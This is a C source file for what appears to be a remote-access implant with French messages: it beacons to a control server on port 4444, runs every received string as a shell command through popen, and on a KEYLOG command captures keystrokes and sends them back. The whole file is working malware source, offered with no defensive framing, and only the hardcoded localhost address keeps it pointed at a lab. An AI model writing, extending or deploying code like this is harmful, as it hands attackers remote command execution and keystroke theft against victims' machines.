#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include "../include/keylog.h"

int main()
{
    char agent_id[32];
    snprintf(agent_id, sizeof(agent_id), "agent-%d", getpid());

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) { perror("socket"); return 1; }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(4444);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        perror("connect"); close(sock); return 1;
    }

    printf("[+] Connecté en tant que %s\n", agent_id);

    char buf[2048] = {0};
    char output[65536] = {0};
    char line[1024] = {0};

    while (1) {
        memset(buf, 0, sizeof(buf));
        snprintf(buf, sizeof(buf), "BEACON %s", agent_id);
        if (send(sock, buf, strlen(buf), 0) == -1) break;

        memset(buf, 0, sizeof(buf));
        int n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;
        buf[n] = '\0';

        if (strcmp(buf, "NONE") == 0) {
            sleep(5);
            continue;
        }

        memset(output, 0, sizeof(output));
        if (strncmp(buf, "KEYLOG", 6) == 0) {
        char *keys = start_keylog(10);
        snprintf(output, sizeof(output), "%s", keys ? keys : "[keylog failed]");
        } else {
            FILE *fp = popen(buf, "r");
            if (fp == NULL) {
                snprintf(output, sizeof(output), "[!] Erreur execution\n");
            } else {
                size_t total = 0;
                while (fgets(line, sizeof(line), fp) != NULL) {
                    size_t len = strlen(line);
                    if (total + len < sizeof(output) - 1) {
                        strcat(output, line);
                        total += len;
                    }
                }
                pclose(fp);
            }
        }

        char result_msg[65536 + 128] = {0};
        snprintf(result_msg, sizeof(result_msg), "RESULT %s %s", agent_id, output);
        send(sock, result_msg, strlen(result_msg), 0);

        sleep(5);
    }

    close(sock);
    return 0;
}